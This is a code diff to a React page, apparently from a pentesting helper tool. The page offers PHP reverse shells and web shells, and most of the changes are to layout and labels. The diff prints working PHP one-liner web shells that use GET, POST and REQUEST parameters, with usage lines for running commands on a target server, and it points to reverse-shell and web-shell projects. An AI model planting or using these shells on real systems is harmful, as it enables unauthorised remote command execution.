@@ -221,7 +221,7 @@ export default function PhpReverseShell() {
 					</Col>
 				</Row>
 			</div>
-			<Divider dashed />
+			<Divider orientation='left'>Pentestmonkey's reverse shell</Divider>
 			<div
 				key='a'
 				style={{
@@ -229,7 +229,6 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Title>Pentestmonkey's reverse shell</Title>
 				<Paragraph>This script will make an outbound TCP connection to a hardcoded IP and port.</Paragraph>
 				<Collapse defaultActiveKey={[ '0' ]}>
 					<Panel header='View the souce code' key='1'>
@@ -243,7 +242,7 @@ export default function PhpReverseShell() {
 								rel='noreferrer noopener'
 							>
 								<ArrowsAltOutlined style={{ marginRight: 10 }} />
-								See the github repo of the author
+								Pentestmonkey's repository
 							</a>
 						</Button>
 					</Panel>
@@ -276,7 +275,7 @@ export default function PhpReverseShell() {
 					</Button>
 				</Clipboard>
 			</div>
-			<Divider dashed />
+			<Divider orientation="left">Basic RCE</Divider>
 			<div
 				key='b'
 				style={{
@@ -284,12 +283,11 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Title>Basic RCE</Title>
 				<Paragraph>
 					When you have successfully uploaded your payload, just put your commands after the variable ?cmd=
 					(ex: ?cmd=ls -la")
 				</Paragraph>
-				<Paragraph copyable>{oneLiner}</Paragraph>
+				<Paragraph copyable code editable>{oneLiner}</Paragraph>
 				<Button
 					type='primary'
 					style={{ marginBottom: 10, marginTop: 15 }}
@@ -318,7 +316,7 @@ export default function PhpReverseShell() {
 					</Button>
 				</Clipboard>
 			</div>
-			<Divider dashed />
+			<Divider orientation="left">Web Shell</Divider>
 			<div
 				key='c'
 				style={{
@@ -326,7 +324,6 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Title>Web shell</Title>
 				<Paragraph>
 					p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands
 					on a server when pentesting a PHP application.
@@ -351,11 +348,11 @@ export default function PhpReverseShell() {
 				</Button>
 				<Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
 					<a href='https://github.com/flozz/p0wny-shell' target='_blank' rel='noopener noreferrer'>
-						<ArrowsAltOutlined /> See the repo of the author
+						<ArrowsAltOutlined /> Flozz's repository
 					</a>
 				</Button>
 			</div>
-			<Divider dashed />
+			<Divider orientation="left">Obfuscated PHP Web Shell</Divider>
 			<div
 				key='d'
 				style={{
@@ -363,8 +360,7 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Title>Obfuscated PHP Web Shell</Title>
-				<Paragraph copyable>{'<?=`$_GET[0]`?>'}</Paragraph>
+				<Paragraph copyable code editable>{'<?=`$_GET[0]`?>'}</Paragraph>
 				<Paragraph>{' Usage : http://target.com/path/to/shell.php?0=command '}</Paragraph>
 				<Button
 					type='primary'
@@ -388,7 +384,6 @@ export default function PhpReverseShell() {
 					</Button>
 				</Clipboard>
 			</div>
-			<Divider dashed />
 			<div
 				key='e'
 				style={{
@@ -396,7 +391,7 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Paragraph copyable>{'<?=`$_POST[0]`?>'}</Paragraph>
+				<Paragraph copyable code editable>{'<?=`$_POST[0]`?>'}</Paragraph>
 				<Paragraph>{' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '}</Paragraph>
 				<Button
 					type='primary'
@@ -420,7 +415,6 @@ export default function PhpReverseShell() {
 					</Button>
 				</Clipboard>
 			</div>
-			<Divider dashed />
 			<div
 				key='f'
 				style={{
@@ -428,7 +422,7 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Paragraph copyable>{"<?=`{$_REQUEST['_']}`?>"}</Paragraph>
+				<Paragraph copyable code editable>{"<?=`{$_REQUEST['_']}`?>"}</Paragraph>
 				<Paragraph>Usage :</Paragraph>
 				<Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
 				<Paragraph>- curl -X POST http://target.com/path/to/shell.php -d "_=command" '</Paragraph>
@@ -454,7 +448,6 @@ export default function PhpReverseShell() {
 					</Button>
 				</Clipboard>
 			</div>
-			<Divider dashed />
 			<div
 				key='f'
 				style={{
@@ -462,7 +455,7 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Paragraph copyable>{shell_obfuscate}</Paragraph>
+				<Paragraph copyable code editable>{shell_obfuscate}</Paragraph>
 				<Paragraph>Usage :</Paragraph>
 				<Paragraph>- http://target.com/path/to/shell.php?0=command</Paragraph>
 				<Button
@@ -487,7 +480,6 @@ export default function PhpReverseShell() {
 					</Button>
 				</Clipboard>
 			</div>
-			<Divider dashed />
 			<div
 				key='g'
 				style={{
@@ -495,7 +487,7 @@ export default function PhpReverseShell() {
 					marginTop: 15
 				}}
 			>
-				<Paragraph copyable>{shell_obfuscate_function}</Paragraph>
+				<Paragraph copyable code editable>{shell_obfuscate_function}</Paragraph>
 				<Paragraph>Usage :</Paragraph>
 				<Paragraph>- http://target.com/path/to/shell.php?_=function&__=argument</Paragraph>
 				<Paragraph>- http://target.com/path/to/shell.php?_=system&__=ls</Paragraph>
